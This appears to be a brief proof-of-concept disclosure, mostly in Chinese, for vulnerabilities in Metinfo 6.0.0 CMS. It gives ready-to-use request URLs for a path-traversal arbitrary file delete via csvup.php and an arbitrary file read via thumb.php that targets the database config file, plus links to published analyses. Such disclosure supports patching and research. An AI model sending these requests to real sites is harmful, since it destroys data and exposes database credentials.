
## Affected Version  

 **Metinfo 6.0.0**

## POC 

### 1 CMS安装的时候，比如数据库名字会被直接写进配置文件中。

### 2 任意删除

好像需要登陆后，才能执行成功。 admin目录下。

    192.168.0.4/metinfo600/admin/app/batch/csvup.php?fileField=test-1&flienamecsv=../../../config/test.txt

### 3  任意文件读取

![](http://opmi2ydgh.bkt.clouddn.com//18-9-12/44499643.jpg)

    metinfo600/include/thumb.php?dir=http\..\..\config\config_db.php

## References

[Metinfo 6.0.0 众多漏洞分析](https://www.anquanke.com/post/id/154149)

[ MetInfo 任意文件读取漏洞的修复与绕过](https://paper.seebug.org/676/)







